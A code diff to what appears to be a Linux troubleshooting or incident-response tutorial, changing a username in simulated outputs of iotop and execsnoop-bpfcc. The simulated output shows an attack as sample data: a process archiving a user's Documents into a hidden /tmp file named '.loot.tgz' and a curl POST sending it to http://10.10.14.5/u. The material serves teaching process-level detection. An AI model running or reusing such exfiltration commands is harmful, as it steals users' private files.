@@ -114,8 +114,8 @@ nvme0n1          0.00  481.50      0.00  82176.00     0.00     0.00   0.00   0.0
             out: `Total DISK READ :       0.00 B/s | Total DISK WRITE :     142.83 M/s
 Current DISK READ:       0.00 B/s | Current DISK WRITE:     158.42 M/s
     PID  PRIO  USER     DISK READ DISK WRITE>    SWAPIN     IO    COMMAND
-  14271 be/4 nobody       0.00 B/s  138.21 M/s  0.00 %  87.42 % tar -czf /tmp/.x11-unix/.loot.tgz /home/wallyson/Documents
-   1284 be/4 wallyson     0.00 B/s    2.18 M/s  0.00 %   1.21 % Xorg
+  14271 be/4 nobody       0.00 B/s  138.21 M/s  0.00 %  87.42 % tar -czf /tmp/.x11-unix/.loot.tgz /home/ana/Documents
+   1284 be/4 ana     0.00 B/s    2.18 M/s  0.00 %   1.21 % Xorg
     412 be/4 root         0.00 B/s    1.92 M/s  0.00 %   0.42 % systemd-journald`,
             outType: "error",
           },
@@ -330,8 +330,8 @@ u       filtrar por usuário
           {
             cmd: "sudo execsnoop-bpfcc",
             out: `PCOMM            PID    PPID   RET ARGS
-sh               14820  14271    0 sh -c tar czf /tmp/.x11-unix/.loot.tgz /home/wallyson/Documents
-tar              14821  14820    0 tar czf /tmp/.x11-unix/.loot.tgz /home/wallyson/Documents
+sh               14820  14271    0 sh -c tar czf /tmp/.x11-unix/.loot.tgz /home/ana/Documents
+tar              14821  14820    0 tar czf /tmp/.x11-unix/.loot.tgz /home/ana/Documents
 sh               14905  14271    0 sh -c curl -X POST --data-binary @/tmp/.x11-unix/.loot.tgz http://10.10.14.5/u
 curl             14906  14905    0 curl -X POST --data-binary @/tmp/.x11-unix/.loot.tgz http://10.10.14.5/u`,
             outType: "error",
